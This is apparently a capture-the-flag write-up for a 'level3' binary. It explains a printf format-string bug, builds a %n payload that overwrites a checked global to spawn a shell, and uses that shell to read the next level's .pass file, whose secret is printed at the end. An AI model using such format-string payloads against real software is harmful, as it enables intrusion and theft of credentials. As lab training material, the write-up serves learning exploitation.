## Analysis

The program calls fgets(), which is a secured function against buffer overflow. Then it prints the buffer.
An impossible check is realized, if it returns true, a meaningless string is printed and a shell launched via system call.

`0x080484da <+54>:    mov    0x804988c,%eax`
`0x080484df <+59>:    cmp    $0x40,%eax`

Otherwise the function returns 0.

## Exploit

Format string : the printf is called directly with the user-provided input so we can use the %n formatter to write into an address an arbitrary value.

`0x080484d5 <+49>:    call   0x8048390 <printf@plt>`

## Crafting

0		   4			  64		66	     68
[TARGET_MEMORY_ADDR][RANDOM_PADDING_STRING][$_FORMATTER][%N_FORMATTER]
	^					^		^
	| 3.write(len(0 - 64))			|    1.read     |		   2.fetch
	|					----------------------- printf() ------------ stack[3] (TARGET_MEMORY_ADDR)
	|							         |
	------------------------------------------------------------------

We provide the %n formatter to printf(). This one lets us to write into the following argument the number of characters written before meeting it.
We use the $x formatter to access the 4th argument on the stack, which is the beginning of our buffer.
Our buffer head is the memory address value checked by the critical cmp instruction.
We pad our buffer with enough noise to match the other operand of value of cmp instruction.
						
## Shooting

python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload_level3
cat /tmp/payload_level3 - | ./level3 

$ cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
